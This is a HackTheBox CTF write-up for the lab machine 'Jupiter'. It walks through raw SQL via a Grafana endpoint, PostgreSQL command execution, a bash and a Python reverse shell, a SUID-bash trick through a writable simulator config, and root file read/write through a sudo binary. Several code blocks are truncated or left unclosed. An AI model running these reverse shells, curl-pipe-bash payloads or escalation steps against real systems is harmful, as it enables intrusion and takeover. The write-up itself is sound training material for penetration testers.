<center><strong><font color="DarkGray"><a href="https://app.hackthebox.com/machines/Jupiter" target="_blank"><er>Jupiter</er></a> is a vulnerable machine from HackTheBox, featuring a Grafana instance connected to a PostgreSQL database. Initial access involves exploiting a Grafana endpoint to execute SQL queries for code execution. Lateral movement occurs through a misconfigured cron in Shadow Simulator. Gaining access to a Jupyter Notebook leads to further exploration, which eventually leads to gaining access to the box as a secondary user. Once access to this user is gained, privilege escalation can be achieved by abusing a Satellite Tracking System binary that may be executed with sudo privileges by the secondary user.</font></strong></center>

### **<strong><font color="DarkKhaki">Initial Scan:</font></strong>**

Initial nmap scan:
```bash
$ nmap -sC -sV -T4 -oN nmap/nmap.inital 10.10.11.216 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 23:14 EDT
Nmap scan report for 10.10.11.216
Host is up (0.095s latency).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
```

### **<strong><font color="DarkKhaki">All ports:</font></strong>**

```bash
$ nmap -p- -T4 10.10.11.216 
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
* Same ports discovered during the initial scan

## **<strong><font color="DarkCyan">/etc/hosts</font></strong>**

According to nmap, navigating to http://10.10.11.236 redirects to http://jupiter.htb, which means we need to add this hostname into our local `/etc/hosts` file:

```bash
$ echo '10.10.11.216  jupiter.htb' >> /etc/hosts
```

## **<strong><font color="DarkCyan">Service Enumeration</font></strong>**
### **<strong><font color="MediumPurple">SSH - 22:</font></strong>**

I’ll temporarily suspend the enumeration of this service, just in case I don’t discover any valuable information that could help establish an initial foothold on the other service.

### **<strong><font color="MediumPurple">TCP/80: jupiter.htb</font></strong>**
#### **<strong><font color="DarkKhaki">Front page:</font></strong>**

Navigating to http://jupiter.htb, we see the following page (`/index.html`) <br/>

#### **<strong><font color="DarkKhaki">Source Code:</font></strong>**
The source code of the front page contains only the usual stuff and does not have some interesting comments and files that we can investigate further. <br/>
The `/js/` and `/img` directories, where Javascript files and images are stored, does not have directory listing enabled, and returns a **403 FORBIDDEN** upon accessing it: <br/>

#### **<strong><font color="DarkKhaki">Fuzzing:</font></strong>**

* Fuzzing for files/directories does not reveal interesting files/directories. However by fuzzing for virtual hosts using `ffuf`, I found a virtual host `kiosk.jupiter.htb`

```bash
ffuf -u http://jupiter.htb -H 'Host: FUZZ.jupiter.htb' -fc 301 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt

### **<strong><font color="MediumPurple">TCP/80: kiosk.jupiter.htb</font></strong>**
#### **<strong><font color="DarkKhaki">Front page:</font></strong>**

Before navigating to http://kiosk.jupiter.htb/, let's add the new virtual host into our `/etc/hosts` file, as displayed below: <br/>
```bash
$ echo '10.10.11.216  jupiter.htb kiosk.jupiter.htb' >> /etc/hosts
```

This virtual host is running a **Grafana** instance, which is an open-source, highly customizable platform used for monitoring and observability. It provides a way to visualize, analyze and understand metrics and data from various sources in real-time. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_11_19-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://kiosk.jupiter.htb</i></center>
<br/>

The running version is `9.5.2`, which is is not vulnerable to any critical vulnerability such as Remote Code Execution that would allow to gain a shell on the target system. <br/>

#### **<strong><font color="DarkKhaki">/login:</font></strong>**

Clicking on the `Sign in` button on the top right hand-side of the page, leads to the login page, where a user can enter a valid username/email and password in order to login successfully: <br/>

<br/>

#### **<strong><font color="DarkKhaki">Directory Fuzzing:</font></strong>**

Using `ffuf`, I was able to identify multiple directories/files but most of them are not really interesting and will prove to be useful for this pentest. <br/>

#### **<strong><font color="DarkKhaki">API queries:</font></strong>**

After some time trying to find the vulnerability in this web application, I revisited the previous requests that I (and the web application) made, in the **HTTP History** tab of Burpsuite (*Because I always enable passive intercepting of request in the background while manually enumerating the web application !!*) and I found some interesting API calls.
When a user navigates to http://kiosk.jupiter.htb, the below are the requests that are made in the background: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_15_28-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Burpsuite: /api/ds/query</i></center>
<br/>

* As can be seen, the first request is the GET request to `kiosk.jupiter.htb`. After that, multiple API requests are issued. the most interesting requests are the POST request to `/api/ds/query` endpoint.<br/>

Let's take the first POST request and analyze it further to see what it does exactly: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_26_39-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/api/ds/query - Request</i></center>
<br/>

* As can be seen, this request is actually executing a SQL query (*via `rawSql` key*) on a PostgreSQL database. And the web application is returning the results of the query via the `values` key: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_30_23-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/api/ds/query - Response</i></center>
<br/>

With that in mind, we can use this endpoint to issue SQL queries to the database and will probably retrieve sensitive information such as credentials to gain a foothold on the server.<br/>

# **<strong><font color="Brown">Initial Foothold</font></strong>**

***
## **<strong><font color="DarkCyan">Shell as postgres</font></strong>**
### **<strong><font color="MediumPurple">Interacting with the database</font></strong>**

* By referring to this [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md) cheat-sheet, we can perform a proper enumeration of the target PostgreSQL database.

#### **<strong><font color="DarkKhaki">Enumeration: Version</font></strong>**

We can enumerate the version by running the SQL query: `SELECT version()`: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_35_46-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SELECT version()</i></center>
<br/>

* As can be seen, the target version of PostgreSQL is `14.8` and is running on a **64-bit** Ubuntu operating system.

#### **<strong><font color="DarkKhaki">Enumeration: Usernames & Password  hashes</font></strong>**

We can return a list of usernames for all the database users in this PostgreSQL database, by running the command: `SELECT usename FROM pg_user;` <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_38_05-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SELECT usename FROM pg_user</i></center>
<br/>

* There are 2 users: 
	* `postgres`
	* `grafana_viewer`

We can also return password hashes of these 2 users: `SELECT username,passwd FROM pg_shadow;`
<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_38_05-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SELECT username,passwd FROM pg_shadow</i></center>
<br/>


#### **<strong><font color="DarkKhaki">Enumeration: Database Name</font></strong>**

We can get the name of the current database via the command: `SELECT current_database();`
<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_44_51-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SELECT current_database()</i></center>
<br/>

* The current database is `moon_namesdb`.

#### **<strong><font color="DarkKhaki">Enumeration: Listing databases</font></strong>**

We can get a list of databases via the command `SELECT datname FROM pg_database;`
<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_47_07-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SELECT datname FROM pg_database</i></center>
<br/>


#### **<strong><font color="DarkKhaki">Enumeration: Tables</font></strong>**

We can get a list of tables names in the current database using the SQL command `SELECT table_name FROM information_schema.tables;`
<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 15_48_53-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SELECT table_name FROM information_schema.tables</i></center>
<br/>

* As can be seen, multiple tables are returned. However, the most interesting table in there is `cmd_exec` table, which can be used to execute commands on the server as shown [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution)

> **NOTE**: *The table `pg_user` would also be interesting if the password are printed, but in this case, they are not (replaced by asterisks '\*')* 

<br/>
<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 16_05_10-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SELECT * FROM pg_user</i></center>
<br/>


#### **<strong><font color="DarkKhaki">Running the 'id' command</font></strong>**

> **NOTE**: *If the table `cmd_exec` does not exist in your case, you can simply create by issuing the SQL query: `CREATE TABLE cmd_exec(cmd_output text);` and then continue the exploitation as shown below !!*

We can run a command by simply issuing the below SQL query:

```sql

#### **<strong><font color="DarkKhaki">Foothold as postgres</font></strong>**

We can gain an initial foothold on the box, as `postgres`, by following the steps below:

**1-** Create a file named `rev.sh` that contains the following bash script: <br/>
```bash
/usr/bin/bash -i >& /dev/tcp/<tun0-IP>/9999 0>&1
```

**2-** Start a python web server on port 80, which will serve the `rev.sh` file. <br/>
```bash
python3 -m http.server 80
```

**3-** Start a netcat listener on port 9999: <br/>
```bash
nc -nlvp 9999
```

**4-** Execute the following SQL query:

```sql
COPY cmd_exec FROM PROGRAM 'curl http://<tun0-IP>/rev.sh | bash';
```

**5-** Check your netcat listener: <br/>

#### **<strong><font color="DarkKhaki">Enumeration</font></strong>**

* There are **4** users with a console: `root`, `juno`, `jovian` and me `postgres` <br/>

```bash
postgres@jupiter:~$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash

postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
jovian:x:1001:1002:,,,:/home/jovian:/bin/bash
```

* There are no interesting binaries with SUID bit set
* The user `postgres` may not run sudo in the box
* The `opt` contains a folder called `solar-flares`. However, `postgres` does not have access rights to it. Only the user `jovian` and members of the group `science` can access it: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 16_10_08-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/opt/solar-flares</i></center>
<br/>

* In the attempt of searching for files/directories owned by other users and in the same time readable or writable by me (`postgres`), I found an interesting file named `network-simulation.json` and located in `/dev/shm/network-simulation.yml` directory:

```bash
postgres@jupiter:/$ find / -type f -user juno -readable -writable 2>/dev/null | grep -v 'proc\|usr\|var\|boot'

/dev/shm/network-simulation.yml
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 16_14_54-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/dev/shm/network-simulation.yml</i></center>
<br/>

* As can be seen, this file is owned by ``juno`` user and is readable/writable by any other users, including `postgres`.

#### **<strong><font color="DarkKhaki">network-simulation.yml file</font></strong>**

Below, is the content of this file:
```bash
postgres@jupiter:/dev/shm$ cat network-simulation.yml 
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

* In summary, this is a YAML configuration file which sets up a network simulation with a server an 3 client hosts. The server runs an HTTP server using Python, while the client uses cURL to make requests to the server.

With that in mind, I ran [pspy64](https://github.com/DominicBreuker/pspy) binary to monitor ongoing processes and I noticed that this file is executed with `juno` privileges every 2 minutes as a [shadow simulation](https://shadow.github.io/docs/guide/getting_started_basic.html) using the `/home/juno/.local/bin/shadow` binary. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 16_30_11-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/dev/shm/network-simulation.yml</i></center>
<br/>

* As can be seen, when the **yaml** configuration file is executed, an HTTP server is launched using python and requests were made using **cURL**

***
## **<strong><font color="DarkCyan">Shell as juno</font></strong>**
### **<strong><font color="DarkKhaki">Exploiting shadow network simulation config file</font></strong>**

Since the user `postgres` has write permissions over the configuration file `/dev/shm/network-simulation.yml`, we can modify the YAML configuration file as explained below to gain access as `juno` user. <br/>

1. Set the `args` key to be `/usr/bin/bash /var/tmp/bash` for the host with the name 'server'
2. Set the `path` key to be `/usr/bin/chmod` and the `args` key to be `u+s /var/tmp/bash` for the second host named 'client'

Below is the entire configuration file (*modified*) :
```bash
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /usr/bin/bash /var/tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /var/tmp/bash
      start_time: 5s
```

This configuration, when executed, will make the following actions:
1. Copy the `/usr/bin/bash` binary into `/var/tmp/` directory
2. Grant the SUID bit to the copied binary `/var/tmp/bash`, which then can be used to escalate to `juno` user via the command `/var/tmp/bash -p`

Now, all we can do is wait for the configuration file to be executed and we will get a bash session as `juno` by running the command:

```bash
postgres@jupiter:~$ /var/tmp/bash -p
```

<center><i>Lateral Movement - shell as 'juno'</i></center>
<br/>


### **<strong><font color="DarkKhaki">SSH Access (Persistence)</font></strong>**

To gain a stable persistent access on the target machine as `juno`, we can generate locally an SSH key pair (`id_rsa` and `id_rsa.pub`), and then add the private key (*The content of `id_rsa.pub`*) into the `/home/juno/.ssh/authorized_keys` file:

**1-** Generate SSH keys on the attacking machine: <br/>
```bash
$ ssh-keygen
```

**2-** Copy the content of `id_rsa.pub`: <br/>
```bash
$ cat id_rsa.pub | xclip -selection clipboard
```

**3-** Go back to the target machine and paste the copied public key into `/home/juno/.ssh/authorized_keys` file: <br/>
```bash
juno@jupiter:~$ echo '<paste-here>' >> /home/juno/.ssh/authorized_keys
```

**4-** On the attacking machine, run the command below to establish an SSH connection using private key: <br/>
```bash
$ ssh -i id_rsa juno@jupiter.htb
Enter passphrase for key 'id_rsa': <Enter the passphrase you set in ssh-keygen, here>
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 21_08_24-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SSH Access as 'juno'</i></center>
<br/>

## **<strong><font color="DarkCyan">Shell as jovian</font></strong>**
### **<strong><font color="DarkKhaki">Running services</font></strong>**

* After gaining access on the box as `juno`, I checked if this user can run binary with sudo, but a password is required in order to get this info, which we do no have.
* After that, I run the `ss -lntp` command to view running services on the machine and I found 3 services running internally on localhost interface, as shown in the figure below:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 21_19_37-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>ss -lntp</i></center>
<br/>

To interact with these services, I did port forwarding via SSH as shown below:

```bash
$ ssh -i id_rsa -L 3000:127.0.0.1:3000 -f -N juno@jupiter.htb 
Enter passphrase for key 'id_rsa': 

$ ssh -i id_rsa -L 5432:127.0.0.1:5432 -f -N juno@jupiter.htb
Enter passphrase for key 'id_rsa': 

 $ ssh -i id_rsa -L 8888:127.0.0.1:8888 -f -N juno@jupiter.htb
Enter passphrase for key 'id_rsa':
```

* With this step out of the way, we can enumerate these services on our attacking machine.

### **<strong><font color="DarkKhaki">Enumeration of services</font></strong>**

A quick nmap scan on these services, we get the following result:
```bash
$ nmap -p8888,5432,3000 127.0.0.1 -sV

Nmap scan report for localhost (127.0.0.1)                                                    
Host is up (0.00021s latency).                                                                

PORT     STATE SERVICE    VERSION

8888/tcp open  http       Tornado httpd 6.2
```

**1-** The service on port **3000** is running a Grafana instance (*The same version of Grafana instance running on port **80***) <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 00_56_56-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://127.0.0.1:3000</i></center>
<br/>


**2-** The service on port **5432** running a PostgreSQL version 9.6.0 or later. This version is not vulnerable to a critical vulnerability and we don't have legitimate credentials to access the database. This PostgreSQL database is probably the one we interacted with in order to gain a foothold on the box as `postgres`. <br/>

**3-** The final service running on port **8888** is running a **Jupyter Notebook** application. Navigating to http://127.0.0.1:8888/ you will be presented with a login page where you need to provide a password or access token in order to gain access to the dashboard. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 01_01_32-KaliLinux - VMware Workstation 17 Player (Non-commercial use only) 1.png" alt="">
<center><i>http://127.0.0.1:8888</i></center>
<br/>


### **<strong><font color="DarkKhaki">Finding the token</font></strong>**

The user `juno` (*our user*) is a member of the `science` group, which means we can access the folder `solar-flares` (*we encountered earlier when performing enumeration as `postgres`*), inside the `/opt` directory. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 01_08_34-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>'science' group</i></center>
<br/>


This folder contains some file with `.ipynb` extension, which are notebook document created by Jupyter Notebook itself. There is also a bash script named `start`, which will basically start a Jupyter Notebook server without opening a web browser and runs the the Jupyter Notebook file `flares.ipynb`. It also redirects standard error output to the log file in the `/opt/solar-flares/logs/` directory. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 01_14_46-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Content of '/opt/solar-flares/' dir</i></center>
<br/>


The `logs` folder contains multiple log files saved from different timestamps. Each log file contains a token. This token is printed to the user each time the Jupyter server is started. With that in mind, the last saved log file would probably contain the correct token, in my case it was `2e820a7a74308131cb7bf5e7761eaca866837fb548fd6820` <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 01_18_56-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Token in logs</i></center>
<br/>

> *It might be a different token in your case !!*

### **<strong><font color="DarkKhaki">Access Jupyter Notebook Dashboard</font></strong>**

We can use this token to access the dashboard of Jupyter Notebook Application: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 01_21_54-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Jupiter Notebook Dashboard</i></center>
<br/>

* As can be seen, we are presented with the files and folders located in the `/opt/solar-flares` directory, which is the directory from which the notebook was launched.

### **<strong><font color="DarkKhaki">Code Execution</font></strong>**

The Jupyter Notebook has a cool feature, which allows a user to run code in a wide range of languages. Each Notebook is associated with a kernel. If, for example, this notebook is associated with the **IPython** kernel, we can run python code within the application.
This feature can be used in our favor, pentesters, to run OS command as the user who started the Notebook. <br/>
In this case, this notebook is associated with a Pyhton3 kernel, *ipykernel*: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 01_28_28-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>ipykernel</i></center>
<br/>

By clicking on that button, *Python3 (ipykernel)*, we will be redirected to the interface where we can execute python code: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-19 01_30_15-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Python script execution interface</i></center>
<br/>

Let's, for example, run the `whoami` command via the python script below:
```python
import os
whoami = os.system("whoami")
print(whoami)
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-jupiter/2023-10-18 23_39_12-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>whoami script</i></center>
<br/>

* As can be seen, we are running OS commands as the `jovian`.

> **NOTE**: *You can run the script by pressing `CTRL + ENTER` hotkey*

### **<strong><font color="DarkKhaki">Shell as jovian</font></strong>**

We can gain a fully interactive shell, by following the steps below:

**1-** Start a netcat listener on a port of your choice (e.g. **9997**) <br/>
```bash
$ nc -nlvp 9997
```

**2-** Run the python script: <br/> 
```python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.126",9997)) # CHANGE THE IP AND PORT
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

```

* It looks like it's a '**Satellite Tracking System**' and it needs a configuration file to be executed successfully. 

* After a quick google search on this tracking system, I didn't really find any alike binaries. I found some [old tools](https://github.com/cole-hsv/sattrack) with the same name but the documentation is not properly written, so it's hard to understand what the tool does and how to provide the configuration file it needs.

* Running the `strings` command on the binary and grepping for `config` we see that the binary reads a configuration file with a JSON format inside the `/tmp/` directory. If the file with these attributes does not exist, it will return the message: '*Configuration file has not been found. Please try again!*'

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",

Here is a breakdown of the key elements in this JSON configuration file:
1. `tleroot`: defines the location to get & load TLE (*Two-Line Element Set*) files. In this file, it is set to `/tmp/tle/`
2. `tlefile` : defines the TLE filename to load from the `tleroot`.
3. `tlesources`: defines an array of URLs from which `tlefile` can be downloaded into `tleroot` using something like 'cURL'.

### **<strong><font color="DarkKhaki">/root/root.txt</font></strong>**

With this in mind, we can make this satellite tracker system download the root flag `root.txt` and put it inside `/tmp/tle`, which is defined in the `tleroot` key. <br/>
This can be achieved by loading the configuration file below:
```json
{
        "tleroot": "/tmp/tle/",
        "tlefile": "root.txt",   
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "file:///root/root.txt"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

* The only modified 2 values are:
	* `tlefile`, which is set to `root.txt`
	* `tlesources`, which is set to an array of one element that defines the location of the file `root.txt`: `file:///root/root.txt`

We can put this file in the ``/tmp`` directory, and run the `sattrack` binary with root privileges: <br/>

Now the content of `/root/root.txt` should be inside the `/tmp/tle/` directory: <br/>

<br/>


> **NOTE**: *I tried to retrieve the SSH private key of the root user `/root/.ssh/id_rsa`, but from the output below, it's safe to assume that the file does not exist.*

<br/>

With this vulnerability, we can read any files on the server, including the `/etc/shadow` file. We can then attempt to crack the root password hash and if successful, we can gain access via SSH as the root. <br/>

### **<strong><font color="DarkKhaki">SSH Access as root</font></strong>**

In order to gain an SSH access as root on this box, we can write our own SSH public key into the `/root/.ssh/authorized_keys` file and then SSH as root using the private key. <br/>
To do so, we can follow the steps below:

**1-** Generate an SSH keys using `ssh-keygen`: <br/>
```bash
$ ssh-keygen 
```

**2-** Save the public key `id_rsa.pub` into a file called `authorized_keys` <br/>
```bash
$ mv id_rsa.pub authorized_keys
```

**3-** Start an HTTP server serving the `authorized_keys` file <br/>
```bash
$ python3 -m http.sevrer 80
```

**4-** Go back to the target machine, and modify the `/tmp/config.json` file as shown below: <br/>

```json
{
        "tleroot": "/root/.ssh/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://10.10.14.126/authorized_keys",
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

**5-** Run the `sattrack` binary with sudo: <br/>
```bash
jovian@jupiter:/tmp$ sudo /usr/local/bin/sattrack 
```
